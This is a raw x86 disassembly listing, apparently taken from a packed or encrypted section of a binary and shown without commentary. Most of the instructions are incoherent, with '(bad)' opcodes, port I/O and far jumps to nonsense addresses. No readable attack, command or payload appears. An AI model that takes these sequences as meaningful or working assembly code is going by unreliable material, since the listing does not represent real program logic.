  409195:	arpl   WORD PTR [esi-0x45],di
  409198:	cmp    al,0xee
  40919a:	test   cl,0x0
  40919d:	popf   
  40919e:	mov    edx,0xfc076ec0
  4091a3:	dec    ebp
  4091a4:	xchg   ecx,eax
  4091a5:	mov    al,ds:0xb4dfa444
  4091aa:	call   FWORD PTR [eax+0x12]
  4091ad:	jns    0x409166
  4091af:	shr    BYTE PTR [edx],cl
  4091b1:	test   BYTE PTR [edx+eiz*1+0x1],ah
  4091b5:	sbb    ah,bl
  4091b7:	int3   
  4091b8:	push   esp
  4091b9:	jl     0x4091c6
  4091bb:	pop    ebp
  4091bc:	sub    al,BYTE PTR [ebx]
  4091be:	bound  edi,QWORD PTR [esi+0x670d0e3f]
  4091c4:	cmp    DWORD PTR ds:0x1853e70d,eax
  4091ca:	add    eax,0x2cf57674
  4091cf:	in     eax,0xe5
  4091d1:	push   ds
  4091d2:	jnp    0x4091c2
  4091d4:	xchg   ebx,eax
  4091d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091d6:	(bad)  
  4091d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091d8:	push   edx
  4091d9:	enter  0xd538,0x78
  4091dd:	(bad)  
  4091de:	xchg   edi,eax
  4091df:	or     eax,0x4c99bad9
  4091e4:	fstp   TBYTE PTR [ebp-0x56]
  4091e7:	aas    
  4091e8:	mov    dl,0x4b
  4091ea:	sub    esp,esp
  4091ec:	mov    dh,BYTE PTR [esi]
  4091ee:	stos   DWORD PTR es:[edi],eax
  4091ef:	cdq    
  4091f0:	stos   DWORD PTR es:[edi],eax
  4091f1:	sbb    ecx,esi
  4091f3:	jp     0x40925c
  4091f5:	mov    cl,0x33
  4091f7:	inc    esp
  4091f8:	adc    DWORD PTR [eax+ecx*8],ebp
  4091fb:	mov    al,ds:0x12cbd068
  409200:	retf   
  409201:	mov    BYTE PTR [edx],dl
  409203:	sar    BYTE PTR [esi+0x4],0x3e
  409207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409208:	mov    WORD PTR [esi+0x65],gs
  40920b:	adc    bl,BYTE PTR [ebp+0x39]
  40920e:	sub    BYTE PTR [ecx],bl
  409210:	jno    0x4091cb
  409212:	sbb    DWORD PTR [edx-0x2],0xf95fa387
  409219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40921b:	push   ecx
  40921c:	push   esi
  40921d:	daa    
  40921e:	push   es
  40921f:	clc    
  409220:	jecxz  0x4091bf
  409222:	add    ecx,ebp
  409224:	shl    DWORD PTR [edx+edi*2],1
  409227:	das    
  409228:	jnp    0x409262
  40922a:	sbb    DWORD PTR [ebx-0x4f],esp
  40922d:	pop    ecx
  40922e:	sub    al,0x65
  409230:	mov    ds,WORD PTR [edi]
  409232:	cmp    DWORD PTR [edi],ecx
  409234:	xchg   edi,eax
  409235:	jl     0x4091c0
  409237:	sbb    eax,0x3ea0e330
  40923c:	cmp    DWORD PTR [ebp-0x44],ebp
  40923f:	stc    
  409240:	jo     0x40922c
  409242:	das    
  409243:	lods   al,BYTE PTR ds:[esi]
  409244:	mov    esp,0x5acdf3e6
  409249:	ds (bad) 
  40924c:	add    BYTE PTR [esi-0x22165cb7],ch
  409252:	jb     0x40926f
  409254:	cmp    DWORD PTR ds:0x9e5e451d,esp
  40925a:	inc    ebp
  40925b:	sub    esp,esi
  40925d:	pop    ebp
  40925e:	add    BYTE PTR [esi+0x68b2c3f1],al
  409264:	push   edi
  409265:	and    DWORD PTR [ebp+edi*1+0x7b],esp
  409269:	js     0x409254
  40926b:	bound  edi,QWORD PTR [eax]
  40926d:	pop    es
  40926e:	stc    
  40926f:	mov    cl,cl
  409271:	test   ah,0x6f
  409274:	test   BYTE PTR [esi+eax*1-0x54],0x6b
  409279:	pop    esp
  40927a:	adc    al,0x5b
  40927c:	pop    edi
  40927d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40927e:	ds (bad) 
  409280:	jne    0x409211
  409282:	inc    ebx
  409283:	xchg   esp,eax
  409284:	(bad)  
  409285:	jno    0x409248
  409287:	inc    edx
  409288:	ret    0xdd08
  40928b:	and    eax,0x1ec1e542
  409290:	jp     0x409216
  409292:	push   cs
  409293:	mov    eax,ds:0xc6d3c2af
  409298:	imul   ecx,DWORD PTR [edx],0xd6def88f
  40929e:	xor    dh,ch
  4092a0:	fsubr  QWORD PTR [edi+0x36]
  4092a3:	pop    edi
  4092a4:	(bad)  
  4092a5:	xchg   edx,eax
  4092a6:	mov    BYTE PTR [edx+ebp*2],bh
  4092a9:	xor    al,0x45
  4092ab:	or     ecx,DWORD PTR [edx-0x615e1024]
  4092b1:	les    edx,FWORD PTR [ecx-0x26ed8947]
  4092b7:	xchg   ecx,eax
  4092b8:	sti    
  4092b9:	rcl    BYTE PTR [edx+esi*4-0x47],1
  4092bd:	or     esi,esi
  4092bf:	(bad)  
  4092c0:	adc    BYTE PTR [edx+0x3741dac9],0x4f
  4092c7:	sub    DWORD PTR [ebp-0x5d40c073],edi
  4092cd:	sahf   
  4092ce:	push   esi
  4092cf:	out    dx,al
  4092d0:	sub    al,0xf0
  4092d2:	stc    
  4092d3:	add    ecx,edx
  4092d5:	add    eax,0x6dac1e87
  4092da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092db:	jg     0x40930b
  4092dd:	dec    ebp
  4092de:	mov    ah,0xcf
  4092e0:	cmp    eax,0xa3dcaefe
  4092e5:	sub    eax,0x33bdd87e
  4092ea:	es jnp 0x40936a
  4092ed:	fiadd  DWORD PTR [ebx-0x12]
  4092f0:	sbb    edi,ebx
  4092f2:	push   edi
  4092f3:	loop   0x40935f
  4092f5:	lods   al,BYTE PTR ds:[esi]
  4092f6:	aas    
  4092f7:	sti    
  4092f8:	jne    0x4092ca
  4092fa:	fistp  QWORD PTR [ebp-0x66744a2c]
  409300:	frndint 
  409302:	sub    edx,DWORD PTR [esi-0x38]
  409305:	xchg   ebx,eax
  409306:	sbb    eax,0x71bd9362
  40930b:	(bad)  
  40930c:	or     eax,0xb3acbe71
  409311:	in     eax,0x4c
  409313:	sub    bl,BYTE PTR [edi]
  409315:	sar    al,1
  409317:	rcr    DWORD PTR [ecx+0x31c8ce78],1
  40931d:	mov    DWORD PTR [eax-0x72],esi
  409320:	(bad)  
  409321:	xchg   BYTE PTR [edx+0xfb70780],ch
  409327:	arpl   WORD PTR [edx+0x5e8088ef],sp
  40932d:	xchg   ebp,eax
  40932e:	mov    DWORD PTR [ecx-0x73ebabcb],esp
  409334:	jno    0x409376
  409336:	aad    0x1d
  409338:	push   0x31
  40933a:	popa   
  40933b:	dec    esi
  40933c:	aam    0xa8
  40933e:	mov    eax,0xd8ba150e
  409343:	scas   eax,DWORD PTR es:[edi]
  409344:	cmp    DWORD PTR [esi],ebx
  409346:	cdq    
  409347:	xlat   BYTE PTR ds:[ebx]
  409348:	fisubr WORD PTR [edi+0x41]
  40934b:	push   ecx
  40934c:	jp     0x40939b
  40934e:	cmp    BYTE PTR ss:[ecx+0x35],dl
  409352:	or     DWORD PTR [edx+0x34],edi
  409355:	mov    eax,ds:0x4ae9e00
  40935a:	gs loop 0x4093cf
  40935d:	add    ebp,ebp
  40935f:	popa   
  409360:	loop   0x409331
  409362:	and    ebx,ebp
  409364:	aas    
  409365:	in     eax,0x7c
  409367:	scas   al,BYTE PTR es:[edi]
  409368:	sbb    al,0x3b
  40936a:	leave  
  40936b:	int3   
  40936c:	sub    BYTE PTR [eax],ah
  40936e:	and    BYTE PTR [edi-0xd],cl
  409371:	cdq    
  409372:	push   0x43
  409374:	xchg   BYTE PTR [edx],dh
  409376:	fisub  DWORD PTR [eax]
  409378:	push   cs
  409379:	xor    BYTE PTR [edx],0x80
  40937c:	daa    
  40937d:	mov    al,ds:0xd80b1f1a
  409382:	adc    al,0x55
  409384:	cli    
  409385:	aam    0x91
  409387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409388:	sub    DWORD PTR [edi+0x28],ebp
  40938b:	cmc    
  40938c:	fstp   st(5)
  40938e:	outs   dx,DWORD PTR ds:[esi]
  40938f:	sub    al,0x42
  409391:	jns    0x409333
  409393:	sbb    al,0x58
  409395:	mov    edi,0x99afb370
  40939a:	or     bh,BYTE PTR [edi]
  40939c:	scas   al,BYTE PTR es:[edi]
  40939d:	or     cl,BYTE PTR [esi]
  40939f:	nop
  4093a0:	fadd   st(7),st
  4093a2:	add    DWORD PTR [ecx+0x70],0x96b380ed
  4093a9:	pop    eax
  4093aa:	adc    BYTE PTR ds:0xc53f1c05,0x33
  4093b1:	loope  0x4093f6
  4093b3:	and    BYTE PTR [eax+0x258867b5],al
  4093b9:	sub    ecx,ebx
  4093bb:	push   ecx
  4093bc:	sub    BYTE PTR [ebx+eiz*2+0x79],cl
  4093c0:	js     0x40943c
  4093c2:	ins    DWORD PTR es:[edi],dx
  4093c3:	lahf   
  4093c4:	mov    ds:0xfba2a69c,al
  4093c9:	mov    cl,0x80
  4093cb:	sbb    al,0xea
  4093cd:	push   edi
  4093ce:	sub    eax,0xb0d4366b
  4093d3:	ficomp WORD PTR [eax-0x60]
  4093d6:	push   ecx
  4093d7:	push   eax
  4093d8:	xor    dh,bl
  4093da:	mov    al,bh
  4093dc:	pop    ss
  4093dd:	lock cdq 
  4093df:	repz pop edi
  4093e1:	mov    ch,0x74
  4093e3:	fmul   DWORD PTR [edx+edi*1]
  4093e6:	xchg   esp,eax
  4093e7:	push   es
  4093e8:	repz test DWORD PTR [esi-0x52],esp
  4093ec:	lods   eax,DWORD PTR ds:[esi]
  4093ed:	or     BYTE PTR [edi+0x1b],cl
  4093f0:	repz out 0x8d,eax
  4093f3:	adc    DWORD PTR [edx+0x214946a],esi
  4093f9:	in     eax,dx
  4093fa:	ins    BYTE PTR es:[edi],dx
  4093fb:	aam    0xcf
  4093fd:	pop    edx
  4093fe:	sub    al,0xaa
  409400:	mov    eax,esi
  409402:	push   ecx
  409403:	sbb    al,BYTE PTR [ecx+0x45e1e0a6]
  409409:	mov    bh,0x38
  40940b:	xchg   ebx,eax
  40940c:	dec    ebp
  40940d:	or     eax,0x841f5cb1
  409412:	(bad)  
  409413:	mul    BYTE PTR [edx]
  409415:	xor    al,0xfd
  409417:	mov    ch,0x95
  409419:	jnp    0x4093c2
  40941b:	jnp    0x40945b
  40941d:	jl     0x409426
  40941f:	mov    dh,0x6c
  409421:	mov    ecx,?
  409423:	enter  0xbb5f,0x76
  409427:	mov    ch,0x36
  409429:	fimul  DWORD PTR [edi-0x6f]
  40942c:	mov    ebx,0xcab080a3
  409431:	lods   eax,DWORD PTR ds:[esi]
  409432:	sbb    DWORD PTR [edi+0xf],0x3c
  409436:	je     0x40949f
  409438:	fnsave [ebx]
  40943a:	pop    ecx
  40943b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40943c:	mov    ah,0xd7
  40943e:	sub    DWORD PTR [ebx+ecx*8],esp
  409441:	sbb    DWORD PTR [eax],0x46
  409444:	mov    eax,ds:0x42236cc5
  409449:	jns    0x40948b
  40944b:	pop    esp
  40944c:	ret    0xd317
  40944f:	fisubr WORD PTR [esi-0x33d6af]
  409455:	pop    ecx
  409456:	pop    ebp
  409457:	stc    
  409458:	das    
  409459:	shl    BYTE PTR [eax-0x77],0x95
  40945d:	gs pop esp
  40945f:	int    0x2b
  409461:	jecxz  0x4094ad
  409463:	push   ecx
  409464:	mov    esp,0xcce05977
  409469:	inc    esi
  40946a:	sti    
  40946b:	adc    edx,DWORD PTR [ebx-0x8]
  40946e:	dec    esi
  40946f:	adc    BYTE PTR [eax+0x4d],al
  409472:	or     bh,bl
  409474:	inc    edx
  409475:	fldenv [ebx-0x11]
  409478:	rcl    DWORD PTR [esi],cl
  40947a:	ja     0x4094b6
  40947c:	out    0x1b,eax
  40947e:	cli    
  40947f:	xchg   edx,eax
  409480:	add    dl,0x72
  409483:	add    BYTE PTR [ebx+0x1d],bl
  409486:	in     eax,0x6c
  409488:	push   0xffffffd2
  40948a:	lods   al,BYTE PTR ds:[esi]
  40948b:	fisttp DWORD PTR [ebx+0x2951073e]
  409491:	or     eax,0x4ee5716f
  409496:	jae    0x409467
  409498:	out    dx,eax
  409499:	sub    al,0x0
  40949b:	pop    ds
  40949c:	pop    esp
  40949d:	pop    edx
  40949e:	xchg   esp,eax
  40949f:	push   0xffffffe1
  4094a1:	ja     0x409438
  4094a3:	jmp    0xbc4b:0x80dfc1ca
  4094aa:	and    ebp,edx
  4094ac:	xchg   edi,eax
  4094ad:	rcr    DWORD PTR [ecx+ebx*4+0x24c162e2],1
  4094b4:	sbb    DWORD PTR [esi],esp
  4094b6:	xlat   BYTE PTR ds:[ebx]
  4094b7:	adc    eax,0x1b7647df
  4094bc:	adc    DWORD PTR [edx+0x7b9e3db0],esi
  4094c2:	inc    edx
  4094c3:	ins    DWORD PTR es:[edi],dx
  4094c4:	cmp    dh,al
  4094c6:	repnz dec edi
  4094c8:	in     al,0xf8
  4094ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094cb:	jl     0x40945a
  4094cd:	and    al,0xec
  4094cf:	ficomp DWORD PTR [ebx+0x6d]
  4094d2:	mov    esi,0xe912b714
  4094d7:	fwait
  4094d8:	and    ch,BYTE PTR [edi+0x51]
  4094db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094dc:	fsub   st(5),st
  4094de:	xchg   ebx,eax
  4094df:	xchg   esp,eax
  4094e0:	clc    
  4094e1:	jge    0x4094cc
  4094e3:	or     BYTE PTR [eax+0x5f],bl
  4094e6:	aad    0xa5
  4094e8:	iret   
  4094e9:	lea    esi,[ebx+edx*8-0x7a]
  4094ed:	pop    edi
  4094ee:	stc    
  4094ef:	aaa    
  4094f0:	pop    eax
  4094f1:	imul   ebx,DWORD PTR [esi],0xfffffffc
  4094f4:	cmp    DWORD PTR [ebx],ecx
  4094f6:	fisttp QWORD PTR [ecx+0x14]
  4094f9:	jecxz  0x4094b0
  4094fb:	fild   QWORD PTR [edi]
  4094fd:	leave  
  4094fe:	fcmovbe st,st(4)
  409500:	iret   
  409501:	ror    BYTE PTR [bx+si-0x34],0x69
  409506:	test   BYTE PTR [edi],ah
  409508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409509:	mov    bh,0x46
  40950b:	mov    dh,bl
  40950d:	mov    esp,0xa0d57d49
  409512:	sbb    eax,0x1f3c7281
  409517:	imul   ebp,ebx,0x71a33b73
  40951d:	mov    eax,0x2b9514da
  409522:	mov    ?,WORD PTR [ecx-0x3bbc60bb]
  409528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409529:	lahf   
  40952a:	in     eax,dx
  40952b:	das    
  40952c:	pop    es
  40952d:	jge    0x4094c6
  40952f:	sahf   
  409530:	test   eax,0xabf7d59b
  409535:	call   0x5100:0x4f90d1ee
  40953c:	scas   eax,DWORD PTR es:[edi]
  40953d:	mov    bl,0x33
  40953f:	push   esp
  409540:	mov    ah,0xf8
  409542:	mov    ds:0x6473bcc7,eax
  409547:	cmp    eax,0x7c26db86
  40954c:	xor    eax,0x515ab227
  409551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409552:	sahf   
  409553:	xlat   BYTE PTR ds:[ebx]
  409554:	pop    eax
  409555:	sti    
  409556:	xor    eax,DWORD PTR [ebx]
  409558:	popf   
  409559:	fstp   TBYTE PTR [edi-0x3]
  40955c:	mov    eax,0xf5b3d11b
  409561:	shr    BYTE PTR [ebp-0x5e3aa5aa],cl
  409567:	das    
  409568:	or     ebx,DWORD PTR [si]
  40956b:	sbb    al,BYTE PTR [esi-0x9]
  40956e:	push   esp
  40956f:	fwait
  409570:	cmp    al,0xdf
  409572:	add    eax,0x8181ae24
  409577:	xor    BYTE PTR [eax],ch
  409579:	mov    fs,WORD PTR [eax-0x78]
  40957c:	out    dx,eax
  40957d:	outs   dx,BYTE PTR ds:[esi]
  40957e:	icebp  
  40957f:	rol    esp,1
  409581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409582:	iret   
  409583:	cmp    dh,BYTE PTR [ecx-0x5933a7b8]
  409589:	xchg   edi,eax
  40958a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40958b:	fisubr WORD PTR [esi]
  40958d:	jmp    0x4095bf
  40958f:	xor    eax,0xfc614c94
  409594:	lods   eax,DWORD PTR ds:[esi]
  409595:	dec    ecx
  409596:	and    DWORD PTR ds:0xf5e109ad,ebx
  40959c:	das    
  40959d:	mov    bh,0x21
  40959f:	retf   0xa843
  4095a2:	sar    DWORD PTR [edx],1
  4095a4:	xchg   BYTE PTR ds:0xae37d8a2,ah
  4095aa:	shl    DWORD PTR [eax],0xd0
  4095ad:	fldcw  WORD PTR [esi-0x3f]
  4095b0:	aaa    
  4095b1:	repz cmc 
  4095b3:	lahf   
  4095b4:	dec    eax
  4095b5:	dec    esi
  4095b6:	adc    esp,ebx
  4095b8:	dec    ebp
  4095b9:	mov    DWORD PTR [eax+0x4b81193],esp
  4095bf:	jmp    0x7af:0x6289b225
  4095c6:	jle    0x40960a
  4095c8:	mov    cl,0xd6
  4095ca:	ret    
  4095cb:	imul   esi,DWORD PTR [ebx-0x40],0x3dd1bbba
  4095d2:	mov    al,0xa7
  4095d4:	mov    al,0xe
  4095d6:	pop    ecx
  4095d7:	jle    0x409571
  4095d9:	adc    BYTE PTR [esp+eax*4+0x75],0xb4
  4095de:	jno    0x4095f6
  4095e0:	xor    esi,edx
  4095e2:	mov    dl,0xea
  4095e4:	jg     0x40961a
  4095e6:	xchg   esi,eax
  4095e7:	jle    0x409634
  4095e9:	retf   
  4095ea:	sbb    ch,bl
  4095ec:	push   esi
  4095ed:	mov    WORD PTR [ebp-0x6e5f6632],cs
  4095f3:	pop    DWORD PTR [eiz*4+0x6fdd36dc]
  4095fa:	jl     0x409638
  4095fc:	pop    ebp
  4095fd:	mov    bh,0xfa
  4095ff:	mov    ecx,edi
  409601:	push   ds
  409602:	dec    ecx
  409603:	dec    ebx
  409604:	xchg   edx,eax
  409605:	in     eax,0xc
  409607:	ins    BYTE PTR es:[edi],dx
  409608:	into   
  409609:	jne    0x4095d7
  40960b:	enter  0x4807,0xb4
  40960f:	call   0xda713100
  409614:	popf   
  409615:	sub    al,0xdf
  409617:	leave  
  409618:	stos   DWORD PTR es:[edi],eax
  409619:	xchg   DWORD PTR [edx-0x55c195e3],edx
  40961f:	xchg   ebp,eax
  409620:	inc    edx
  409621:	mov    al,ah
  409623:	pop    eax
  409624:	inc    ebp
  409625:	xchg   BYTE PTR [ebx],ah
  409627:	fiadd  DWORD PTR [eax-0x6d5408fb]
  40962d:	fwait
  40962e:	in     eax,0xc9
  409630:	mov    bl,bl
  409632:	jbe    0x40966e
  409634:	push   ss
  409635:	sbb    eax,0xcbe2c863
  40963a:	test   al,0xfe
  40963c:	push   esi
  40963d:	cmp    BYTE PTR [edx],ch
  40963f:	repnz adc eax,0x47fad577
  409645:	mov    ecx,0x58fe972e
  40964a:	push   ds
  40964b:	or     bl,ah
  40964d:	mov    ecx,DWORD PTR [ebp+0x7dd66d83]
  409653:	inc    edi
  409654:	in     al,dx
  409655:	loop   0x4095f7
  409657:	add    bh,BYTE PTR [esi]
  409659:	repz adc BYTE PTR [edx-0x586a58eb],al
  409660:	xchg   esp,eax
  409661:	mov    ah,0x1c
  409663:	or     BYTE PTR [ebp+ebx*4-0x5fff59b4],bh
  40966a:	ret    0x42bd
  40966d:	dec    ebp
  40966e:	cli    
  40966f:	jg     0x4096cc
  409671:	xchg   cl,dh
  409673:	retf   
  409674:	das    
  409675:	mov    ecx,0x27c15c81
  40967a:	cmp    ebp,ebp
  40967c:	add    eax,0x93b3a6a6
  409681:	stos   BYTE PTR es:[edi],al
  409682:	add    eax,0x25662dfb
  409687:	test   ebp,0x73abe6a
  40968d:	call   0x92c711b6
  409692:	xor    eax,0xa9db1aba
  409697:	mov    cl,0x13
  409699:	das    
  40969a:	and    ebx,ebp
  40969c:	mov    eax,0xbfc6b06
  4096a1:	adc    eax,0x57de0b81
  4096a6:	daa    
  4096a7:	out    dx,al
  4096a8:	mov    al,ds:0xb439d331
  4096ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096ae:	cmp    bl,cl
  4096b0:	or     bl,bh
  4096b2:	stos   DWORD PTR es:[edi],eax
  4096b3:	or     al,0x7d
  4096b5:	cmp    ebx,DWORD PTR [eax-0x3c648507]
  4096bb:	(bad)  
  4096bc:	(bad)  
  4096bd:	cmp    BYTE PTR [esi+0xd],bl
  4096c0:	sbb    al,0x8b
  4096c2:	mov    ecx,0xe6023d72
  4096c7:	xor    ecx,DWORD PTR cs:[edx-0x6b1da3a0]
  4096ce:	punpckldq mm5,DWORD PTR [esp+edx*2+0x29567693]
  4096d6:	cwde   
  4096d7:	xor    eax,0x6405a184
  4096dc:	pop    edi
  4096dd:	ret    0x15f5
  4096e0:	test   BYTE PTR [ebx-0x4670b3b8],ch
  4096e6:	enter  0x7eb0,0x7
  4096ea:	icebp  
  4096eb:	push   cs
  4096ec:	(bad)  
  4096ed:	pop    es
  4096ee:	inc    eax
  4096ef:	call   0xf3b4:0xfc79d227
  4096f6:	inc    ebp
  4096f7:	pushf  
  4096f8:	pop    ebx
  4096f9:	push   es
  4096fa:	xor    DWORD PTR [ebp-0x3d],edx
  4096fd:	push   0x175e9a05
  409702:	xor    al,0xb5
  409704:	test   ah,ch
  409706:	iret   
  409707:	add    eax,0x6ab941f5
  40970c:	dec    ebp
  40970d:	fisttp QWORD PTR [eax]
  40970f:	bound  edx,QWORD PTR [ecx]
  409711:	in     eax,0xca
  409713:	imul   BYTE PTR [ebp-0x4b68848e]
  409719:	inc    edx
  40971a:	outs   dx,BYTE PTR ds:[esi]
  40971b:	xchg   BYTE PTR [edx-0x2b9ccab5],al
  409721:	call   0xe3f8:0x1469bcc7
  409728:	scas   eax,DWORD PTR es:[edi]
  409729:	cmp    al,0xfb
  40972b:	mov    ss,WORD PTR [ecx+0x30]
  40972e:	cmp    BYTE PTR [ebp+0x11],dl
  409731:	jl     0x4096d5
  409733:	inc    esi
  409734:	mov    dh,0xd9
  409736:	mov    ah,0x25
  409738:	scas   al,BYTE PTR es:[edi]
  409739:	jns    0x4096dd
  40973b:	clc    
  40973c:	pop    ss
  40973d:	xchg   esp,eax
  40973e:	jno    0x40971b
  409740:	lods   eax,DWORD PTR ds:[esi]
  409741:	dec    edi
  409742:	out    0xa,eax
  409744:	push   DWORD PTR [ebp-0x7a]
  409747:	outs   dx,BYTE PTR ds:[esi]
  409748:	push   ds
  409749:	into   
  40974a:	mov    ebp,0x5d649c46
  40974f:	rol    DWORD PTR [eax+0x3a],cl
  409752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409753:	rol    BYTE PTR [bx-0x5e94],cl
  409758:	dec    esp
  409759:	inc    esi
  40975a:	xchg   edx,eax
  40975b:	xor    bl,al
  40975d:	or     ecx,DWORD PTR [ebp-0x7c30bbc2]
  409763:	mov    ecx,0x21dd17fd
  409768:	jno    0x409726
  40976a:	xchg   ecx,eax
  40976b:	sbb    DWORD PTR [esi+0x67],eax
  40976e:	mov    ch,0x7
  409770:	aam    0xd
  409772:	push   edx
  409773:	fist   DWORD PTR [ebp+0x7b]
  409776:	popa   
  409777:	ss dec esi
  409779:	ds cmc 
  40977b:	into   
  40977c:	clc    
  40977d:	fs sti 
  40977f:	rol    DWORD PTR [ebx-0x748e5650],0xd9
  409786:	cwde   
  409787:	sub    eax,0x2606dcdc
  40978c:	adc    DWORD PTR [eax],esp
  40978e:	aaa    
  40978f:	outs   dx,BYTE PTR ds:[esi]
  409790:	cdq    
  409791:	rcl    DWORD PTR [ebp+0x5f4ed7f9],cl
  409797:	stos   BYTE PTR es:[edi],al
  409798:	jne    0x409760
  40979a:	push   0x55
  40979c:	mov    edi,0x60b71d22
  4097a1:	adc    cl,0x75
  4097a4:	lahf   
  4097a5:	lock (bad) 
  4097a7:	sub    esp,DWORD PTR [edx-0x69]
  4097aa:	mov    BYTE PTR [esi],dh
  4097ac:	daa    
  4097ad:	lea    ebp,[ebx+esi*8-0x1e5b1263]
  4097b4:	ins    DWORD PTR es:[edi],dx
  4097b5:	sahf   
  4097b6:	push   ecx
  4097b7:	inc    edx
  4097b8:	idiv   bh
  4097ba:	dec    eax
  4097bb:	icebp  
  4097bc:	stc    
  4097bd:	adc    bl,BYTE PTR gs:[ebx-0x19bb55d0]
  4097c4:	dec    edi
  4097c5:	mov    dh,0x1a
  4097c7:	jo     0x409776
  4097c9:	bound  edi,QWORD PTR [esi-0x40f94503]
  4097cf:	lock mov eax,0x886c2355
  4097d5:	mov    ebp,0xff785280
  4097da:	imul   DWORD PTR [ebx]
  4097dc:	pusha  
  4097dd:	and    ebx,DWORD PTR [eax+0x6adde3a1]
  4097e3:	sbb    al,0xdf
  4097e5:	dec    edi
  4097e6:	xlat   BYTE PTR ss:[ebx]
  4097e8:	cli    
  4097e9:	int    0x7e
  4097eb:	(bad)  
  4097ec:	stos   BYTE PTR es:[edi],al
  4097ed:	sub    al,0x7e
  4097ef:	fisub  WORD PTR [esi+0x2]
  4097f2:	retf   
  4097f3:	inc    edx
  4097f4:	mov    dh,0x8c
  4097f6:	xor    al,0x92
  4097f8:	(bad)  
  4097f9:	out    0x9a,eax
  4097fb:	xchg   esp,eax
  4097fc:	repnz mov eax,ds:0x1401db47
  409802:	jle    0x40987b
  409804:	fst    QWORD PTR [ecx]
  409806:	neg    BYTE PTR [ebp+0x62b5aa7b]
  40980c:	out    0x2,eax
  40980e:	xchg   esp,eax
  40980f:	adc    eax,0xfa478e5d
  409814:	maskmovq mm1,mm5
  409817:	out    dx,al
  409818:	push   0xf397c1b4
  40981d:	xchg   ecx,eax
  40981e:	inc    esp
  40981f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409820:	ret    
  409821:	nop/reserved BYTE PTR [esi+ebp*8]
  409825:	add    eax,DWORD PTR [ebx-0x3d4b05a3]
  40982b:	outs   dx,BYTE PTR ds:[esi]
  40982c:	shr    DWORD PTR [edi],0xa9
  40982f:	pop    edi
  409830:	cmp    bh,al
  409832:	outs   dx,DWORD PTR ds:[esi]
  409833:	cli    
  409834:	mov    ebp,0xba3c0e73
  409839:	in     al,dx
  40983a:	imul   eax,ebp,0x55
  40983d:	aad    0x51
  40983f:	aas    
  409840:	rcl    BYTE PTR [ecx-0x285dadfb],1
  409846:	outs   dx,BYTE PTR ds:[esi]
  409847:	sub    DWORD PTR [edi+0x28],esp
  40984a:	dec    esi
  40984b:	pop    ss
  40984c:	jmp    0x409801
  40984e:	lods   eax,DWORD PTR ds:[esi]
  40984f:	mov    ebp,0x1afecd15
  409854:	shl    DWORD PTR [ebx+0x7b],1
  409857:	(bad)  
  409858:	push   edx
  409859:	retf   0x2a58
  40985c:	out    0xef,al
  40985e:	or     BYTE PTR [edi-0x14133e5a],bh
  409864:	mov    ecx,0x82f16bba
  409869:	add    eax,0x6c174cc7
  40986e:	sbb    bl,BYTE PTR [eax]
  409870:	aas    
  409871:	fsub   QWORD PTR [ebp-0x452fad39]
  409877:	adc    BYTE PTR [edi+0x30],0x2c
  40987b:	jb     0x40984d
  40987d:	mov    ebp,0xe5783241
  409882:	sub    dl,BYTE PTR [ebx]
  409884:	outs   dx,DWORD PTR ds:[esi]
  409885:	bound  edx,QWORD PTR [ebp-0x9]
  409888:	jmp    0xecf4:0xd0d99dce
  40988f:	adc    BYTE PTR [esi],al
  409891:	add    eax,0x3a35764
  409896:	cmp    al,0xbb
  409898:	xor    al,0xd3
  40989a:	(bad)  
  40989b:	jns    0x409914
  40989d:	xchg   DWORD PTR [edi],edi
  40989f:	jmp    0x55b3:0xe670c088
  4098a6:	push   edx
  4098a7:	neg    ch
  4098a9:	xor    ah,0xbd
  4098ac:	push   edi
  4098ad:	pop    edi
  4098ae:	fistp  DWORD PTR [eax+0x2b2332fc]
  4098b4:	pushf  
  4098b5:	das    
  4098b6:	or     eax,0x674b26d2
  4098bb:	xchg   BYTE PTR [esi+0x46],al
  4098be:	dec    ecx
  4098bf:	clc    
  4098c0:	(bad)  
  4098c2:	dec    ebx
  4098c3:	fild   DWORD PTR [eax-0x11]
  4098c6:	and    eax,0xd21311d8
  4098cb:	lea    eax,[eax+0x65]
  4098ce:	jbe    0x4098b8
  4098d0:	cmp    eax,0x43e6f22a
  4098d5:	add    dh,BYTE PTR [ecx+0x2d61308c]
  4098db:	mov    dh,0x7
  4098dd:	xor    DWORD PTR [eax-0x51],ecx
  4098e0:	sbb    bh,BYTE PTR [edx+0x55e952b9]
  4098e6:	sbb    DWORD PTR ds:0xfb7a9158,0xffffffbb
  4098ed:	sahf   
  4098ee:	pop    ds
  4098ef:	out    0xc9,ax
  4098f2:	fmul   st(4),st
  4098f4:	mov    esi,ebx
  4098f6:	pusha  
  4098f7:	cmp    ebp,DWORD PTR [ecx]
  4098f9:	add    ebx,ebx
  4098fb:	xchg   ecx,eax
  4098fc:	(bad)  
  4098fd:	(bad)  
  4098fe:	cld    
  4098ff:	sbb    ebp,ebp
  409901:	mov    esi,0xb218bc17
  409906:	adc    eax,0xaa22a66f
  40990b:	or     dh,BYTE PTR [ebx+0x3755da43]
  409911:	test   eax,0xd8da5db5
  409916:	ret    
  409917:	cmp    al,BYTE PTR [esi]
  409919:	inc    eax
  40991a:	popf   
  40991b:	sar    bh,0x96
  40991e:	js     0x4098fb
  409920:	mov    esi,DWORD PTR [edx-0x486244cb]
  409926:	mov    ah,0xb5
  409928:	cwde   
  409929:	(bad)  
  40992a:	into   
  40992b:	mov    ecx,DWORD PTR [esi+0x50]
